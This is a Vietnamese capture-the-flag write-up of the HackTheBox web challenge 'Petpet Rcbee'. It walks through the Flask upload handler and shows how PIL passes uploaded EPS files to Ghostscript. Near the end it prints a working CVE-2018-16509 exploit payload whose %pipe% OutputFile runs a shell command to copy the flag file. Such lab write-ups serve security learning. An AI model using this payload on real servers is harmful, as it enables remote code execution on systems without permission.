---
title: HTB Petpet Rcbee
author: HoangND
date: 2021-09-05 08:51:00 +0700
categories: [Writeups, HackTheBox]
tags: [pil, ghost script]
---

Petpet rcbee là một web challenge. Sau khi xem xét thì thấy rằng trang web chỉ có một chức năng duy nhất là upload 1 ảnh sau đó "pet" ảnh này.

![image](/assets/posts/petpet-rcbee/1.png)

Oke kiểm tra source code xem có gì có thể lợi dụng để RCE thông qua file được tải lên hay không

```python
def petpet(file):

    if not allowed_file(file.filename):
        return {'status': 'failed', 'message': 'Improper filename'}, 400

    try:
        
        tmp_path = save_tmp(file)

        bee = Image.open(tmp_path).convert('RGBA')
        frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
        finalpet = petmotion(bee, frames)

        filename = f'{generate(14)}.gif'
        finalpet[0].save(
            f'{main.app.config["UPLOAD_FOLDER"]}/{filename}', 
            save_all=True, 
            duration=30, 
            loop=0, 
            append_images=finalpet[1:], 
        )

        os.unlink(tmp_path)

        return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200

    except:
        return {'status': 'failed', 'message': 'Something went wrong'}, 500
```

Ảnh sau khi được tải được xử lý bằng hàm petpet. 
Bên trong thực hiện các thao tác như lưu ảnh vào file tạm, generate một ảnh gif dựa trên ảnh này, sau đó đưa nó vào thư mục theo đường dẫn là biến UPLOAD_FOLDER ở trong config. 
Cuối cùng là xóa ảnh trong tmp.

Trang web này sử dụng một thư viện là PIL để xử lý ảnh, để xem PIL có CVE nào k. 
Sau khi xem xét một vòng thì có 1 CVE liên quan đến PIL và Ghostscript để RCE là [CVE-2018-16509](https://store.vsplate.com/en/post/141/), check lại thì bên trong file docker có tồn tại cái gọi là Ghostscript thật.

![image](/assets/posts/petpet-rcbee/2.png)

Sử dụng luôn craft image của CVE, chạy thử trên local

![image](/assets/posts/petpet-rcbee/3.png)

Oke vậy là đã RCE được, bây giờ cần làm thế nào để đọc được flag được dấu bên trong. Để ý rằng có một đường dẫn tệp được public là UPLOAD_FOLDER (/static/petpets/).
Vậy chỉ cần đọc file flag và ghi vào một file bất kỳ trong đường dẫn này là xong.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > application/static/petpets/test.txt) currentdevice putdeviceprops
```

![image](/assets/posts/petpet-rcbee/4.png)
